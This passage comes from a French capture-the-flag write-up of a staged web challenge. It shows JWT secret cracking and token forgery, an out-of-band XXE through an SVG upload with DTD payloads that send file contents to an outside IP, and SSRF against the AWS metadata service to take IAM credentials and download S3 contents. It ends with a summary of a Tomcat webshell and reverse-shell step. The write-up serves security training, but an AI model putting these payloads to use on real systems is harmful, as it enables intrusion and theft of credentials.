+#0 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(281): Swift_Transport_AbstractSmtpTransport-&gt;_assertResponseCode('566 SMTP limit ...', Array)
+#1 /usr/local/lib/php/Swift/Transport/EsmtpTransport.php(245): Swift_Transport_AbstractSmtpTransport-&gt;executeCommand('DATA\r\n', Array, Array)
+#2 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(321): Swift_Transport_EsmtpTransport-&gt;executeCommand('DATA\r\n', Array)
+#3 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(432): Swift_Transport_AbstractSmtpTransport-&gt;_doDataCommand()
+#4 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(449): Swift_Transport_AbstractSmtpTransport-&gt;_doMailTransaction(Object(Swift_Message), 'support@songboo...', Array, Array)
+#5 /usr/local/lib/php/Swift/Transport/Abstra in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php on line 386
+
+While trying to send:
+{
+    &quot;dest&quot;:['test'],
+    &quot;object&quot;:'Password reset instructions for WillyWonka Shop',
+    &quot;from&quot;:'admin@wwonka.shop',&quot;relay&quot;:'backend.willywonka.shop',
+    &quot;content-html&quot;:'
+        &lt;html&gt;
+            &lt;head&gt;
+                &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+                &lt;title&gt;&lt;/title&gt;
+            &lt;/head&gt;
+            &lt;body text=&quot;#000000&quot; bgcolor=&quot;#FFFFFF&quot;&gt;
+                &lt;b&gt;Hello dear associate,&lt;/b&gt;&lt;br&gt;
+                &lt;br&gt;
+                You are receiving this mail after a password reset request has been
+                submitted on Willy Wonka Golden Ticket Shop. &lt;br&gt;
+                &lt;br&gt;
+
+                In order to reset your password, please use this login link and
+                reset your password from your profile &lt;br&gt;
+                &lt;br&gt;
+                &lt;i&gt;&lt;font size=&quot;+3&quot;&gt;&lt;a moz-do-not-send=&quot;true&quot;
+                href=&quot;http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o&quot;&gt;Reset my password&lt;/a&gt;&lt;/font&gt;&lt;/i&gt;&lt;br&gt;
+                &lt;br&gt;
+                &lt;i&gt;&lt;b&gt;Note : if you didn't request this email, please ensure your
+                account hasn't been accessed and perform any relevant security
+                hardening.&lt;/b&gt;&lt;/i&gt;&lt;br&gt;
+                &lt;br&gt;
+                Have a nice day&lt;br&gt;
+                &lt;br&gt;
+                Willy Wonka&lt;br&gt;
+                &lt;a moz-do-not-send=&quot;true&quot; href=&quot;http://willywonka.shop/&quot;&gt;/&lt;/a&gt;&lt;br&gt;
+            &lt;/body&gt;
+        &lt;/html&gt;',
+    &quot;content-text&quot;:'
+        Hello dear associate,
+        
+        You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop.
+        
+        In order to reset your password, please use this login link and reset your password from your profile
+        
+        http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
+        
+        Note : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening.
+        
+        Have a nice day
+        
+        Willy Wonka
+        http://willywonka.shop/'
+}
+
+Find more documentation here :
+https://google.fr
+https://stackoverflow.com
+https://lmgtfy.com
+</code></pre>
+
+<p>Cette trace divulgue des informations sensibles quant au SI de la cible :</p>
+
+<pre><code>* backend.willywonka.shop
+
+* eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
+</code></pre>
+
+<h3 id="ii-4-enumération-web-sur-le-backend">II.4. Enumération web sur le backend</h3>
+
+<p>Nouveau site web, nouveau <code>dirsearch</code> : celui-ci renvoie énormément de <code>403</code>. Après un filtrage de qualité, le scan affiche des résultats pertinents :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e php,html,txt,pdf,zip -t 25 | grep -v 403
+
+Target: https://backend.willywonka.shop
+
+[11:44:07] Starting: 
+[11:44:07] 400 -  166B  - /%2e%2e/google.com
+[11:44:32] 200 -    2KB - /login
+[11:44:33] 302 -  219B  - /logout  -&gt;  http://backend.willywonka.shop/login
+[11:44:37] 302 -  219B  - /reset  -&gt;  http://backend.willywonka.shop/login
+</code></pre>
+
+<p>Les résultats sont relativement équivalents aux résultats du frontend. Cependant, on remarque que toutes les pages du backend sont redirigées vers une page de <code>/login</code>. Cette page attend un JSON Web Token (JWT) :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_backend_jwt.png" alt="" />
+<em>Fig 7</em> : Cookie backend-session
+</center></p>
+
+<p>Le token contient :</p>
+
+<blockquote>
+<p>eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM</p>
+</blockquote>
+
+<pre><code class="language-json">{
+  &quot;_flashes&quot;: [
+    {
+      &quot; t&quot;: [
+        &quot;message&quot;,
+        &quot;No token provided&quot;
+      ]
+    }
+  ]
+}
+
+{}
+</code></pre>
+
+<h3 id="ii-5-craquer-le-secret-du-jwt">II.5. Craquer le secret du JWT</h3>
+
+<p>En rassemblant les différents éléments du test d&rsquo;intrusion, on remarque rapidement que la stacktrace du frontend délivre un JWT et que le cookie du backend en attend un. L&rsquo;hypothèse la plus plausible est de récupérer le secret, modifier le JWT et signer le nouveau JWT. Ci-dessous le token de l&rsquo;utilisateur <code>aas</code> :</p>
+
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
+</code></pre>
+
+<pre><code class="language-json">{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+{
+  &quot;sub&quot;: &quot;aas&quot;,
+  &quot;aud&quot;: &quot;frontend.willywonka.shop&quot;,
+  &quot;iat&quot;: 1563668653,
+  &quot;exp&quot;: 1563669253
+}
+</code></pre>
+
+<p>Afin de créer un nouveau jeton fonctionnel, on modifie les éléments suivants : <code>aud</code> et <code>exp</code>. Le premier élément permet de sélectionner le bon domaine. Le second correspond à l&rsquo;expiration du token, choisir une date suffisamment lointaine garantit la tranquillité. Modifier un JWT <code>HS256</code> est relativement simple. Il existe plusieurs outils efficaces, comme <code>jwt_tool</code>. En passant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :</p>
+
+<pre><code class="language-bash">(KaliVM) ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 
+
+Token header values:
+[+] typ = JWT
+[+] alg = HS256
+
+Token payload values:
+[+] sub = test
+[+] aud = frontend.willywonka.shop
+[+] iat = 1562664315
+[+] exp = 1562664915
+
+######################################################
+# Options:                                           #
+# 1: Check CVE-2015-2951 - alg=None vulnerability    #
+# 2: Check for Public Key bypass in RSA mode         #
+# 3: Check signature against a key                   #
+# 4: Check signature against a key file (&quot;kid&quot;)      #
+# 5: Crack signature with supplied dictionary file   #
+# 6: Tamper with payload data (key required to sign) #
+# 0: Quit                                            #
+######################################################
+
+Please make a selection (1-6)
+&gt; 5
+
+Loading key dictionary...
+File loaded: /opt/t/bf/rockyou.txt
+Testing 14344380 passwords...
+[+] s3cr3t is the CORRECT key!
+</code></pre>
+
+<p>Le secret a été cassé avec succès, il est possible de signer le nouveau jeton avec les paramètres suivants :</p>
+
+<ul>
+<li>aud : backend.willywonka.shop</li>
+<li>exp : 1999999999 -&gt; Une date aux alentours de 2033</li>
+</ul>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_jwtcrafted.png" alt="" />
+<em>Fig 8</em> : Nouveau jeton
+</center></p>
+
+<p>Avec ce nouveau JWT, il est possible de passer outre l&rsquo;authentification et d&rsquo;accéder ainsi au backend de l&rsquo;application :</p>
+
+<pre><code>https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
+</code></pre>
+
+<p>Conformément à l&rsquo;énoncé, le flag se situe dans les données du ticket <code>deadbeef</code> :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step2_auth_bypassed.png" alt="" />
+<em>Fig 9</em> : Second flag
+</center></p>
+
+<h3 id="ii-6-flag">II.6. Flag</h3>
+
+<blockquote>
+<p>7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources">Resources</h3>
+
+<ol>
+<li><strong>danielmiessler</strong>, <em>SecLists - top-usernames-shortlist.txt</em>, GitHub : <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt</a></li>
+<li><strong>Auth0</strong>, <em>JSON Web Token debugger</em>, jwt : <a href="https://jwt.io/">https://jwt.io/</a></li>
+<li><strong>ticarpi</strong>, <em>jwt_tool</em>, GitHub : <a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="iii-step-3-xxe-out-of-band">III. Step 3 - XXE Out-of-band</h2>
+
+<blockquote>
+<p>There&rsquo;s a flag.txt at the server root</p>
+</blockquote>
+
+<p><img src="/img/writeups/wonkachall2019/oob_xxe_dbz.png" alt="" /></p>
+
+<h3 id="tl-dr-2">TL;DR</h3>
+
+<ol>
+<li>Forger une XXE OOB via le fichier SVG ;</li>
+<li>Uploader le fichier SVG à l&rsquo;adresse : <code>http://willywonka.shop/profile?filetype=image%2fsvg%2bxml</code>, ne pas oublier de changer le MIME type ;</li>
+<li>Remplir le formulaire avec <code>aas</code> en nom de victime et de la donnée random ;</li>
+<li>Récupérer l&rsquo;id du ticket et y accéder dans le backend ;</li>
+<li>Cliquer sur <code>autoresize</code> pour déclencher la XXE OOB.</li>
+</ol>
+
+<hr />
+
+<h3 id="iii-1-reconnaissance">III.1. Reconnaissance</h3>
+
+<p>La <a href="https://challenge.akerva.com">plateforme</a> du challenge propose un hint par épreuve. Celui de cette épreuve énonce clairement qu&rsquo;il s&rsquo;agit d&rsquo;une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page <code>submit</code> du <strong>frontend</strong>.</p>
+
+<p>Il est possible pour un attaquant de changer ce MIME type et d&rsquo;uploader ainsi un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d&rsquo;accéder au ticket dans le <strong>backend</strong>.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step3_frontendform.png" alt="" />
+<em>Fig 10</em> : Formulaire d&rsquo;upload sur le frontend
+</center></p>
+
+<h3 id="iii-2-explication-de-l-exploitation">III.2. Explication de l&rsquo;exploitation</h3>
+
+<p>Par défaut, l&rsquo;URL du <strong>frontend</strong> accepte les images PNG : <code>https://frontend.willywonka.shop/profile?filetype=image%2Fpng</code></p>
+
+<p>Le mime-type est présent en paramètre GET, alors pour que l&rsquo;application accepte les SVG XML il suffit de le changer : <code>image%2fsvg%2bxml</code></p>
+
+<p>Une XXE Out-of-band (OOB) est similaire à une XXE &ldquo;classique&rdquo;, ou &ldquo;in-band&rdquo;. Une OOB est une XXE à l&rsquo;aveugle qui va charger un DTD distant. Les entités présentent dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step3_xxe_oob_nutshell.png" alt="" />
+<em>Fig 11</em> : XXE OOB in a nutshell
+</center></p>
+
+<p>Lors de CTF passés, j&rsquo;ai déjà évoqué les XXE OOB : <a href="https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3">Santhacklaus 2018</a>. Dans cet article, le même serveur a été utilisé, mais il est aussi possible d&rsquo;utiliser deux instances <a href="https://maki.bzh/stupidthings/dontpayvps/">ngrok</a>.</p>
+
+<h3 id="iii-3-exploitation">III.3. Exploitation</h3>
+
+<p>Ci-dessous les fichiers nous permettant de mener à bien l&rsquo;exploitation :</p>
+
+<ul>
+<li>ro.svg : le SVG XML contenant l&rsquo;appel des entités externes du fichier DTD.</li>
+</ul>
+
+<pre><code class="language-xml">&lt;!DOCTYPE svg [
+&lt;!ENTITY % file SYSTEM &quot;http://51.158.113.8/ro.dtd&quot;&gt;
+%file;%template;
+]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+    &lt;text x=&quot;10&quot; y=&quot;30&quot;&gt;Injected: &amp;res;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
+
+<ul>
+<li>ro.dtd : charge contenant les entités permettant de cibler un fichier et d&rsquo;exfiltrer son contenu.</li>
+</ul>
+
+<pre><code class="language-xml">&lt;!ENTITY % secret1 SYSTEM &quot;file:///flag.txt&quot;&gt;
+&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'&gt;&quot;&gt;
+</code></pre>
+
+<p><strong>Note</strong> : l&rsquo;adresse IP utilisée (51.158.113.8) est un VPS temporaire de chez <em>Scaleway</em> avec un <strong>Python SimpleHTTPServer</strong> sur le port 80.</p>
+
+<p>Lorsque l&rsquo;environnement est correctement configuré, il ne reste qu&rsquo;à uploader la charge via le formulaire sur le <strong>frontend</strong> :</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step3_frontend_form_filled.png" alt="" />
+<em>Fig 12</em> : Formulaire frontend rempli
+</center></p>
+
+<p>En retour, le <strong>frontend</strong> nous renvoie l&rsquo;identifiant du ticket : <em><code>e6afec4a</code></em>. Le bouton <strong>Autoresize</strong> de l&rsquo;application en <strong>backend</strong> appelle le parser XML vulnérable. C&rsquo;est donc à ce moment que la charge est exécutée.</p>
+
+<p><strong>Note</strong> : on observe de l&rsquo;activité sur les logs du <strong>Python SimpleHTTPServer</strong>.</p>
+
+<p><center>
+<img src="/img/writeups/wonkachall2019/step3_flag.png" alt="" />
+<em>Fig 13</em> : Ticket côté backend
+</center></p>
+
+<p>Dans ce cas précis, ce n&rsquo;est pas réellement une XXE OOB, car le retour s&rsquo;affiche sur l&rsquo;application (cf. Fig 13 - Ticket côté backend).</p>
+
+<h3 id="iii-4-flag">III.4. Flag</h3>
+
+<blockquote>
+<p>0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-1">Resources</h3>
+
+<ol>
+<li><strong>alexbirsan</strong>, <em>LFI and SSRF via XXE in emblem editor</em>, HackerOne : <a href="https://hackerone.com/reports/347139">https://hackerone.com/reports/347139</a></li>
+<li><strong>Ian Muscat</strong>, <em>Out-of-band XML External Entity (OOB-XXE)</em>, Acunetix : <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="iv-step-4-ssrf-to-kfc">IV. Step 4 - SSRF to KFC</h2>
+
+<blockquote>
+<p>Lets check this bucket !</p>
+</blockquote>
+
+<h3 id="tl-dr-3">TL;DR</h3>
+
+<ol>
+<li>La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l&rsquo;adresse suivante : <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+<li>Les informations du bucket se situent ici : <code>http://169.254.169.254/latest/dynamic/instance-identity/document</code></li>
+<li>Initialiser les variables d&rsquo;environnement avec les informations trouvées pour se connecter  : <code>AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN</code></li>
+<li>Lister le contenu du bucket : <code>aws s3 ls s3://willywonka-shop</code></li>
+<li>Récupérer le flag : <code>aws s3 cp s3://willywonka-shop/Flag-04.txt .</code></li>
+</ol>
+
+<hr />
+
+<h3 id="iv-1-reconnaissance">IV.1. Reconnaissance</h3>
+
+<p>Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers. Cependant il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier <code>/etc/passwd</code>, afin de récupérer les utilisateurs du système. Parfois, il arrive que le <code>.bash_history</code> de l&rsquo;utilisateur courant soit accessible par tout le monde, c&rsquo;est ce qu&rsquo;il se passe dans notre cas :</p>
+
+<pre><code class="language-bash">[...]
+sudo vim flag.txt
+curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/  
+[...]
+</code></pre>
+
+<p>Pour des raisons de lisibilité, j&rsquo;ai tronqué le contenu du fichier pour ne garder que les quelques lignes intéressantes.</p>
+
+<p>Revenons à notre XXE, jusqu&rsquo;à présent seul le schéma <code>file://</code> a été utilisé. Amazon utilise le schéma <code>http://</code> pour récupérer les informations du bucket S3. Le <code>.bash_history</code> trouvé précédemment nous donne une de ces requêtes : <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/</code></p>
+
+<h3 id="iv-2-exploitation">IV.2. Exploitation</h3>
+
+<p>En remplaçant <code>file:///flag.txt</code> par <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/</code> dans la charge <strong>ro.dtd</strong>, il est possible de récupérer les informations de connexion.</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % secret1 SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/&quot;&gt;
+&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'&gt;&quot;&gt;
+</code></pre>
+
+<pre><code class="language-json">{
+   &quot;Code&quot;:&quot;Success&quot;,
+   &quot;LastUpdated&quot;:&quot;2019-07-10T14:45:25Z&quot;,
+   &quot;Type&quot;:&quot;AWS-HMAC&quot;,
+   &quot;AccessKeyId&quot;:&quot;ASIAZ47IG35A4F6ZY2ML&quot;,
+   &quot;SecretAccessKey&quot;:&quot;bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn&quot;,
+   &quot;Token&quot;:&quot;AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=&quot;,
+   &quot;Expiration&quot;:&quot;2019-07-10T20:55:48Z&quot;
+}
+</code></pre>
+
+<p>Pour accéder au contenu d&rsquo;un bucket S3, il faut différentes informations secrètes, mais aussi la zone du bucket :</p>
+
+<pre><code class="language-xml">&lt;!ENTITY % secret1 SYSTEM &quot;http://169.254.169.254/latest/dynamic/instance-identity/document&quot;&gt;
+&lt;!ENTITY % template &quot;&lt;!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'&gt;&quot;&gt;
+</code></pre>
+
+<pre><code class="language-json">{
+   &quot;devpayProductCodes&quot;:null,
+   &quot;marketplaceProductCodes&quot;:null,
+   &quot;accountId&quot;:&quot;680702435137&quot;,
+   &quot;availabilityZone&quot;:&quot;eu-west-3c&quot;,
+   &quot;ramdiskId&quot;:null,
+   &quot;kernelId&quot;:null,
+   &quot;pendingTime&quot;:&quot;2019-07-04T16:23:26Z&quot;,
+   &quot;architecture&quot;:&quot;x86_64&quot;,
+   &quot;privateIp&quot;:&quot;172.31.39.217&quot;,
+   &quot;version&quot;:&quot;2017-09-30&quot;,
+   &quot;region&quot;:&quot;eu-west-3&quot;,
+   &quot;imageId&quot;:&quot;ami-0119667e27598718e&quot;,
+   &quot;billingProducts&quot;:null,
+   &quot;instanceId&quot;:&quot;i-0defb90fb5aafe95b&quot;,
+   &quot;instanceType&quot;:&quot;t2.medium&quot;
+}
+</code></pre>
+
+<p>Lorsque toutes ces informations sont réunies, en configurant les différentes variables d&rsquo;environnement, il est possible de se connecter au bucket.</p>
+
+<h3 id="iv-3-connexion-au-bucket-s3">IV.3. Connexion au bucket s3</h3>
+
+<pre><code class="language-bash">(KaliVM) ➜ export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
+(KaliVM) ➜ export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
+(KaliVM) ➜ export AWS_DEFAULT_REGION=eu-west-3
+(KaliVM) ➜ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4=
+
+(KaliVM) ➜ aws s3 ls                                      
+2019-07-04 18:41:42 willywonka-shop
+</code></pre>
+
+<p>La connexion étant établie, nous sommes en mesure de récupérer son contenu :</p>
+
+<pre><code>(KaliVM) ➜ aws s3 ls                      
+2019-07-04 18:41:42 willywonka-shop
+
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/
+                           PRE images/
+                           PRE tools/
+2019-07-05 13:54:47         65 Flag-04.txt
+
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools      
+                           PRE tools/
+
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/     
+                           PRE docs/
+                           PRE vpn/
+2019-07-05 10:15:18          0 
+
+(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/docs/
+2019-07-05 13:15:12          0 
+2019-07-05 13:15:32    1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\'s Oddest Settings.pdf
+2019-07-05 13:15:45    1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf
+                                
+(KaliVM) ➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
+download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt 
+
+(KaliVM) ➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
+download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn
+
+(KaliVM) ➜ cat Flag-04.txt 
+0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
+</code></pre>
+
+<p>En plus du flag de cette étape, il y a un fichier VPN <code>wonka_internal.ovpn</code> dans le bucket, qui laisse présager un active directory.</p>
+
+<h3 id="iv-5-flag">IV.5. Flag</h3>
+
+<blockquote>
+<p>0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528</p>
+</blockquote>
+
+<hr />
+
+<h3 id="resources-2">Resources</h3>
+
+<ol>
+<li><strong>@christophetd</strong>, <em>Abusing the AWS metadata service using SSRF vulnerabilities</em>, Blog de Christophe Tafani-Dereeper : <a href="https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/">https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/</a></li>
+<li><strong>notsosecure team</strong>, <em>Exploiting SSRF in AWS Elastic Beanstalk</em>, notsosecure : <a href="https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/">https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/</a></li>
+</ol>
+
+<hr />
+
+<hr />
+
+<h2 id="v-step-5-tom-cat-and-jerry">V. Step 5 - Tom(cat) and Jerry</h2>
+
+<blockquote>
+<p>Lets get the flag at the root of your first blood</p>
+</blockquote>
+
+<h3 id="tl-dr-4">TL;DR</h3>
+
+<ol>
+<li>Se connecter au VPN récupéré dans le bucket ;</li>
+<li>Une nouvelle route est apparue : <code>172.16.42.0/24</code> ;</li>
+<li>Effectuer une énumération de ce nouveau réseau et remarquer une machine avec le port 8080 (tomcat) ouvert ;</li>
+<li>Utiliser <code>dirsearch</code> avec une wordlist tomcat (seclist), et trouver la page <code>/host-manager/</code> ;</li>
+<li>Se connecter avec les identifiants <code>tomcat : tomcat</code> ;</li>
+<li>Monter un partage samba nommé <code>data</code> avec un webshell (<strong>cmd.war</strong>) à l&rsquo;intérieur ;</li>
+<li>Déployer le webshell en tant que nouvelle application via les <code>UNC path</code> ;</li>
+<li>Accéder au webshell à l&rsquo;adresse : <code>http://maki-lab:8080/cmd/index.jsp?cmd=whoami</code> ;</li>
+<li>Utiliser <strong>netcat</strong> pour faire un reverse shell.</li>
+</ol>
+
+<hr />
+
+<h3 id="v-1-reconnaissance">V.1. Reconnaissance</h3>
+
